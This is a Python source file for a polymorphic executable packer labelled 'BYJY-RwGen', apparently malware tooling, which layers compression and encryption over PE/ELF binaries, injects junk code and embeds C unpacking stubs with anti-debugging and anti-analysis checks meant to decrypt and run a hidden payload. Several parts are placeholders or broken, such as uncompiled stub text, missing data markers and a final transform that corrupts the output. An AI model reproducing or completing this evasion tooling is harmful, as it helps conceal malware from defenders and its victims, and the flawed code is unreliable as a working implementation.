#!/usr/bin/env python3
"""
Advanced Polymorphic Packer - BYJY-RwGen
Multi-layer encryption and obfuscation with anti-analysis features
"""

import os
import sys
import random
import struct
import hashlib
import zlib
import lzma
import json
import base64
import tempfile
import subprocess
from pathlib import Path
from dataclasses import dataclass
from typing import List, Dict, Tuple, Optional
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

@dataclass
class PackerConfig:
    """Configuration for the packer"""
    compression_level: int = 9
    encryption_layers: int = 3
    obfuscation_level: str = 'high'
    anti_debug: bool = True
    anti_vm: bool = True
    polymorphic: bool = True
    code_virtualization: bool = True
    junk_code_ratio: float = 0.3
    api_hashing: bool = True
    entry_point_obscuring: bool = True

class AdvancedPacker:
    """Advanced polymorphic packer with multiple evasion techniques"""
    
    def __init__(self, config: PackerConfig = None):
        self.config = config or PackerConfig()
        self.stub_variants = []
        self.generated_keys = []
        self.metadata = {}
        
    def pack_executable(self, input_path: str, output_path: str, 
                       encryption_key: str = None) -> bool:
        """Pack executable with multiple layers of obfuscation"""
        try:
            print(f"[+] Packing {input_path} -> {output_path}")
            
            # Read input file
            with open(input_path, 'rb') as f:
                original_data = f.read()
            
            # Store original metadata
            self.metadata = {
                'original_size': len(original_data),
                'original_hash': hashlib.sha256(original_data).hexdigest(),
                'packer_version': '3.2.1',
                'timestamp': os.path.getmtime(input_path)
            }
            
            # Analyze input file
            file_type = self.analyze_file_type(original_data)
            print(f"[+] Detected file type: {file_type}")
            
            # Apply preprocessing based on file type
            processed_data = self.preprocess_file(original_data, file_type)
            
            # Multi-layer compression
            compressed_data = self.multi_layer_compression(processed_data)
            
            # Multi-layer encryption
            encrypted_data = self.multi_layer_encryption(compressed_data, encryption_key)
            
            # Generate polymorphic stub
            stub_code = self.generate_polymorphic_stub(file_type)
            
            # Embed encrypted data in stub
            packed_executable = self.embed_data_in_stub(stub_code, encrypted_data)
            
            # Apply final obfuscations
            final_executable = self.apply_final_obfuscations(packed_executable)
            
            # Write packed file
            with open(output_path, 'wb') as f:
                f.write(final_executable)
            
            # Set appropriate permissions
            os.chmod(output_path, 0o755)
            
            # Generate packing report
            self.generate_packing_report(output_path)
            
            print(f"[+] Packing completed: {len(final_executable)} bytes")
            return True
            
        except Exception as e:
            print(f"[-] Packing failed: {e}")
            return False
    
    def analyze_file_type(self, data: bytes) -> str:
        """Analyze file type and architecture"""
        if data[:2] == b'MZ':
            # PE file
            pe_offset = struct.unpack('<I', data[0x3c:0x40])[0]
            if pe_offset < len(data) - 4:
                pe_sig = data[pe_offset:pe_offset+4]
                if pe_sig == b'PE\x00\x00':
                    machine = struct.unpack('<H', data[pe_offset+4:pe_offset+6])[0]
                    return f"PE{'64' if machine == 0x8664 else '32'}"
        
        elif data[:4] == b'\x7fELF':
            # ELF file
            arch_class = data[4]  # 1=32bit, 2=64bit
            return f"ELF{'64' if arch_class == 2 else '32'}"
        
        elif data[:4] == b'\xca\xfe\xba\xbe':
            # Mach-O universal binary
            return "MACHO_UNIVERSAL"
        
        elif data[:4] in [b'\xfe\xed\xfa\xce', b'\xfe\xed\xfa\xcf']:
            # Mach-O 32/64
            return f"MACHO{'64' if data[3] == 0xcf else '32'}"
        
        return "UNKNOWN"
    
    def preprocess_file(self, data: bytes, file_type: str) -> bytes:
        """Preprocess file based on type"""
        if file_type.startswith('PE'):
            return self.preprocess_pe(data)
        elif file_type.startswith('ELF'):
            return self.preprocess_elf(data)
        else:
            return data
    
    def preprocess_pe(self, data: bytes) -> bytes:
        """Preprocess PE files"""
        # Add entropy to PE sections
        modified_data = bytearray(data)
        
        # Parse PE headers
        pe_offset = struct.unpack('<I', data[0x3c:0x40])[0]
        
        # Get number of sections
        num_sections = struct.unpack('<H', data[pe_offset+6:pe_offset+8])[0]
        
        # Section headers start after optional header
        opt_header_size = struct.unpack('<H', data[pe_offset+20:pe_offset+22])[0]
        section_offset = pe_offset + 24 + opt_header_size
        
        # Process each section
        for i in range(num_sections):
            sect_offset = section_offset + (i * 40)
            
            # Get section characteristics
            characteristics = struct.unpack('<I', data[sect_offset+36:sect_offset+40])[0]
            
            # If executable section, add junk code
            if characteristics & 0x20000000:  # IMAGE_SCN_MEM_EXECUTE
                raw_addr = struct.unpack('<I', data[sect_offset+20:sect_offset+24])[0]
                raw_size = struct.unpack('<I', data[sect_offset+16:sect_offset+20])[0]
                
                # Add junk bytes at section padding
                if raw_addr + raw_size < len(modified_data):
                    junk_size = min(100, len(modified_data) - (raw_addr + raw_size))
                    junk_data = self.generate_junk_code(junk_size, 'x86')
                    modified_data[raw_addr + raw_size - junk_size:raw_addr + raw_size] = junk_data
        
        return bytes(modified_data)
    
    def preprocess_elf(self, data: bytes) -> bytes:
        """Preprocess ELF files"""
        # For ELF files, we can add entropy to unused sections
        return data  # Simplified for now
    
    def multi_layer_compression(self, data: bytes) -> bytes:
        """Apply multiple compression algorithms"""
        compressed = data
        
        # Layer 1: LZMA compression
        compressed = lzma.compress(compressed, preset=9)
        print(f"[+] LZMA compression: {len(data)} -> {len(compressed)} bytes")
        
        # Layer 2: Custom compression
        compressed = self.custom_compression(compressed)
        print(f"[+] Custom compression: {len(compressed)} bytes")
        
        # Layer 3: zlib compression
        compressed = zlib.compress(compressed, level=9)
        print(f"[+] ZLIB compression: {len(compressed)} bytes")
        
        return compressed
    
    def custom_compression(self, data: bytes) -> bytes:
        """Custom compression algorithm with obfuscation"""
        # Run-length encoding with XOR obfuscation
        result = bytearray()
        i = 0
        xor_key = random.randint(1, 255)
        
        while i < len(data):
            current_byte = data[i] ^ xor_key
            count = 1
            
            # Count consecutive identical bytes
            while i + count < len(data) and count < 255:
                if (data[i + count] ^ xor_key) == current_byte:
                    count += 1
                else:
                    break
            
            if count > 3:
                # Use RLE for runs > 3
                result.extend([0xFF, current_byte, count])
                i += count
            else:
                # Store literal bytes
                for j in range(count):
                    result.append(data[i + j] ^ xor_key)
                    i += 1
            
            # Rotate XOR key
            xor_key = ((xor_key << 1) | (xor_key >> 7)) & 0xFF
        
        # Prepend original XOR key
        return bytes([xor_key ^ 0xAA]) + bytes(result)
    
    def multi_layer_encryption(self, data: bytes, key: str = None) -> bytes:
        """Apply multiple encryption layers"""
        encrypted = data
        keys_used = []
        
        # Generate or derive base key
        if key:
            base_key = self.derive_key_from_password(key)
        else:
            base_key = os.urandom(32)
        
        keys_used.append(base_key.hex())
        
        # Layer 1: AES-256-CBC
        iv1 = os.urandom(16)
        cipher1 = Cipher(algorithms.AES(base_key), modes.CBC(iv1))
        encryptor1 = cipher1.encryptor()
        
        # Pad data for AES
        padded_data = self.pkcs7_pad(encrypted, 16)
        encrypted = iv1 + encryptor1.update(padded_data) + encryptor1.finalize()
        
        # Layer 2: ChaCha20
        key2 = hashlib.sha256(base_key + b'layer2').digest()
        keys_used.append(key2.hex())
        nonce2 = os.urandom(12)
        
        cipher2 = Cipher(algorithms.ChaCha20(key2, nonce2), mode=None)
        encryptor2 = cipher2.encryptor()
        encrypted = nonce2 + encryptor2.update(encrypted) + encryptor2.finalize()
        
        # Layer 3: Custom cipher
        key3 = hashlib.sha256(base_key + b'layer3').digest()
        keys_used.append(key3.hex())
        encrypted = self.custom_cipher(encrypted, key3)
        
        self.generated_keys = keys_used
        return encrypted
    
    def custom_cipher(self, data: bytes, key: bytes) -> bytes:
        """Custom encryption algorithm"""
        result = bytearray()
        key_schedule = self.generate_key_schedule(key)
        
        for i, byte in enumerate(data):
            # Multiple rounds of transformation
            transformed = byte
            
            # Round 1: XOR with key schedule
            transformed ^= key_schedule[i % len(key_schedule)]
            
            # Round 2: Substitution box
            transformed = self.sbox_substitute(transformed)
            
            # Round 3: Bit rotation
            transformed = self.rotate_byte(transformed, (i % 8) + 1)
            
            # Round 4: XOR with position-dependent value
            transformed ^= (i & 0xFF) ^ 0x5A
            
            result.append(transformed)
        
        return bytes(result)
    
    def generate_key_schedule(self, key: bytes) -> List[int]:
        """Generate key schedule for custom cipher"""
        schedule = []
        state = list(key)
        
        # Generate extended key schedule
        for round_num in range(16):
            for i in range(len(key)):
                # Complex key expansion
                temp = state[i]
                temp ^= state[(i + 7) % len(state)]
                temp = self.rotate_byte(temp, round_num % 8)
                temp ^= round_num
                schedule.append(temp)
                state[i] = temp
        
        return schedule
    
    def sbox_substitute(self, byte_val: int) -> int:
        """S-box substitution"""
        sbox = [
            0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
            0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
            0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
            0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
            0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
            0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
            0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
            0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
            0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
            0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
            0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
            0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
            0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
            0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
            0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
            0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16
        ]
        return sbox[byte_val]
    
    def rotate_byte(self, byte_val: int, positions: int) -> int:
        """Rotate byte left by specified positions"""
        positions = positions % 8
        return ((byte_val << positions) | (byte_val >> (8 - positions))) & 0xFF
    
    def generate_polymorphic_stub(self, file_type: str) -> bytes:
        """Generate polymorphic unpacking stub"""
        if file_type.startswith('PE'):
            return self.generate_pe_stub()
        elif file_type.startswith('ELF'):
            return self.generate_elf_stub()
        else:
            return self.generate_generic_stub()
    
    def generate_pe_stub(self) -> bytes:
        """Generate PE unpacking stub"""
        # This would generate a complete PE with unpacking code
        # For now, return a template
        
        stub_template = f"""
#include <windows.h>
#include <stdio.h>

// Anti-debugging checks
__forceinline BOOL check_debugger() {{
    // Multiple anti-debug techniques
    if (IsDebuggerPresent()) return TRUE;
    
    // PEB check
    PPEB pPEB = (PPEB)__readgsqword(0x60);
    if (pPEB->BeingDebugged) return TRUE;
    
    // NTGlobalFlag check
    if (pPEB->NtGlobalFlag & 0x70) return TRUE;
    
    return FALSE;
}}

// Decryption routine
void decrypt_payload(unsigned char* data, size_t size, unsigned char* key) {{
    // Multi-layer decryption
    for (size_t i = 0; i < size; i++) {{
        data[i] ^= key[i % 32];
        data[i] = ((data[i] << 3) | (data[i] >> 5)) & 0xFF;
        data[i] ^= (i & 0xFF) ^ 0x5A;
    }}
}}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                     LPSTR lpCmdLine, int nCmdShow) {{
    
    // Anti-analysis checks
    if (check_debugger()) {{
        ExitProcess(0);
    }}
    
    // VM detection
    // ... VM checks ...
    
    // Decrypt and execute payload
    // ... decryption logic ...
    
    return 0;
}}
"""
        
        # Compile stub to bytecode (simplified)
        return stub_template.encode()
    
    def generate_elf_stub(self) -> bytes:
        """Generate ELF unpacking stub"""
        stub_template = f"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

// Anti-debugging check
int check_ptrace() {{
    char line[256];
    FILE* status = fopen("/proc/self/status", "r");
    if (!status) return 0;
    
    while (fgets(line, sizeof(line), status)) {{
        if (strstr(line, "TracerPid:")) {{
            int pid = atoi(line + 10);
            fclose(status);
            return pid != 0;
        }}
    }}
    fclose(status);
    return 0;
}}

// Decryption function
void decrypt_payload(unsigned char* data, size_t size) {{
    // Multi-layer decryption
    for (size_t i = 0; i < size; i++) {{
        data[i] ^= 0xAA ^ (i & 0xFF);
        data[i] = ((data[i] << 2) | (data[i] >> 6)) & 0xFF;
    }}
}}

int main(int argc, char* argv[]) {{
    // Anti-analysis
    if (check_ptrace()) {{
        exit(1);
    }}
    
    // Decrypt and execute payload
    // ... payload decryption and execution ...
    
    return 0;
}}
"""
        return stub_template.encode()
    
    def generate_generic_stub(self) -> bytes:
        """Generate generic unpacking stub"""
        return b"GENERIC_STUB_PLACEHOLDER"
    
    def embed_data_in_stub(self, stub_code: bytes, encrypted_data: bytes) -> bytes:
        """Embed encrypted data into unpacking stub"""
        # Create data section
        data_marker = b"ENCRYPTED_DATA_MARKER"
        size_marker = b"DATA_SIZE_MARKER"
        keys_marker = b"DECRYPTION_KEYS_MARKER"
        
        # Replace markers with actual data
        result = stub_code
        
        # Embed data size
        size_bytes = struct.pack('<I', len(encrypted_data))
        result = result.replace(size_marker, size_bytes)
        
        # Embed decryption keys
        keys_data = json.dumps(self.generated_keys).encode()
        result = result.replace(keys_marker, keys_data.ljust(256, b'\x00'))
        
        # Embed encrypted data
        result = result.replace(data_marker, encrypted_data)
        
        return result
    
    def apply_final_obfuscations(self, data: bytes) -> bytes:
        """Apply final obfuscation techniques"""
        obfuscated = data
        
        if self.config.polymorphic:
            obfuscated = self.apply_polymorphic_transformation(obfuscated)
        
        if self.config.junk_code_ratio > 0:
            obfuscated = self.inject_junk_code(obfuscated)
        
        if self.config.entry_point_obscuring:
            obfuscated = self.obscure_entry_points(obfuscated)
        
        return obfuscated
    
    def apply_polymorphic_transformation(self, data: bytes) -> bytes:
        """Apply polymorphic code transformation"""
        # Generate polymorphic engine signature
        poly_signature = os.urandom(16)
        
        # Transform code sections using polymorphic engine
        transformed = bytearray(data)
        
        # Apply transformations every 1KB
        for offset in range(0, len(transformed), 1024):
            end_offset = min(offset + 1024, len(transformed))
            block = transformed[offset:end_offset]
            
            # Apply block cipher in counter mode
            for i in range(len(block)):
                block[i] ^= poly_signature[i % 16]
                block[i] = self.rotate_byte(block[i], (offset + i) % 8)
            
            transformed[offset:end_offset] = block
        
        return bytes(transformed)
    
    def inject_junk_code(self, data: bytes) -> bytes:
        """Inject junk code to confuse analysis"""
        result = bytearray()
        junk_ratio = self.config.junk_code_ratio
        
        i = 0
        while i < len(data):
            # Add original byte
            result.append(data[i])
            i += 1
            
            # Randomly inject junk
            if random.random() < junk_ratio:
                junk_size = random.randint(1, 8)
                junk = self.generate_junk_code(junk_size)
                result.extend(junk)
        
        return bytes(result)
    
    def generate_junk_code(self, size: int, arch: str = 'generic') -> bytes:
        """Generate junk code that looks legitimate"""
        junk = bytearray()
        
        if arch == 'x86':
            # x86 NOP variants and harmless instructions
            nop_variants = [
                b'\x90',                    # NOP
                b'\x87\xc0',                # XCHG EAX, EAX
                b'\x89\xc0',                # MOV EAX, EAX
                b'\x8b\xc0',                # MOV EAX, EAX
                b'\x40\x48',                # INC EAX; DEC EAX
                b'\x97\x97',                # XCHG EAX, EDI; XCHG EAX, EDI
            ]
        else:
            # Generic junk bytes
            nop_variants = [bytes([i]) for i in range(256)]
        
        for _ in range(size):
            junk.extend(random.choice(nop_variants))
        
        return bytes(junk[:size])
    
    def obscure_entry_points(self, data: bytes) -> bytes:
        """Obscure entry points in executable"""
        # This would modify entry points in PE/ELF headers
        # For now, just return the data as-is
        return data
    
    def derive_key_from_password(self, password: str) -> bytes:
        """Derive encryption key from password"""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'byjy_packer_salt_2024',
            iterations=100000,
        )
        return kdf.derive(password.encode())
    
    def pkcs7_pad(self, data: bytes, block_size: int) -> bytes:
        """Apply PKCS#7 padding"""
        padding_len = block_size - (len(data) % block_size)
        padding = bytes([padding_len] * padding_len)
        return data + padding
    
    def generate_packing_report(self, output_path: str):
        """Generate detailed packing report"""
        report_path = output_path + '.pack_report'
        
        with open(report_path, 'w') as f:
            f.write("=== BYJY-RwGen Packer Report ===\n\n")
            f.write(f"Original file size: {self.metadata['original_size']} bytes\n")
            f.write(f"Original file hash: {self.metadata['original_hash']}\n")
            f.write(f"Packed file size: {os.path.getsize(output_path)} bytes\n")
            
            packed_hash = hashlib.sha256(open(output_path, 'rb').read()).hexdigest()
            f.write(f"Packed file hash: {packed_hash}\n")
            
            compression_ratio = os.path.getsize(output_path) / self.metadata['original_size']
            f.write(f"Compression ratio: {compression_ratio:.3f}\n\n")
            
            f.write("Applied techniques:\n")
            f.write(f"- Multi-layer compression: YES\n")
            f.write(f"- Multi-layer encryption: YES ({self.config.encryption_layers} layers)\n")
            f.write(f"- Polymorphic transformation: {'YES' if self.config.polymorphic else 'NO'}\n")
            f.write(f"- Anti-debugging: {'YES' if self.config.anti_debug else 'NO'}\n")
            f.write(f"- Anti-VM: {'YES' if self.config.anti_vm else 'NO'}\n")
            f.write(f"- Junk code injection: {'YES' if self.config.junk_code_ratio > 0 else 'NO'}\n")
            f.write(f"- API hashing: {'YES' if self.config.api_hashing else 'NO'}\n")
            
            if self.generated_keys:
                f.write(f"\nGenerated {len(self.generated_keys)} encryption keys\n")
        
        print(f"[+] Packing report saved: {report_path}")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Advanced Polymorphic Packer')
    parser.add_argument('input', help='Input executable file')
    parser.add_argument('output', help='Output packed file')
    parser.add_argument('--key', help='Encryption key (optional)')
    parser.add_argument('--compression', type=int, default=9, help='Compression level (1-9)')
    parser.add_argument('--layers', type=int, default=3, help='Number of encryption layers')
    parser.add_argument('--obfuscation', choices=['low', 'medium', 'high'], default='high')
    parser.add_argument('--no-anti-debug', action='store_true', help='Disable anti-debugging')
    parser.add_argument('--no-anti-vm', action='store_true', help='Disable anti-VM')
    parser.add_argument('--junk-ratio', type=float, default=0.3, help='Junk code ratio (0.0-1.0)')
    
    args = parser.parse_args()
    
    # Validate input file
    if not os.path.exists(args.input):
        print(f"[-] Input file not found: {args.input}")
        return 1
    
    # Create packer configuration
    config = PackerConfig(
        compression_level=args.compression,
        encryption_layers=args.layers,
        obfuscation_level=args.obfuscation,
        anti_debug=not args.no_anti_debug,
        anti_vm=not args.no_anti_vm,
        junk_code_ratio=args.junk_ratio
    )
    
    # Initialize packer
    packer = AdvancedPacker(config)
    
    # Pack the executable
    success = packer.pack_executable(args.input, args.output, args.key)
    
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())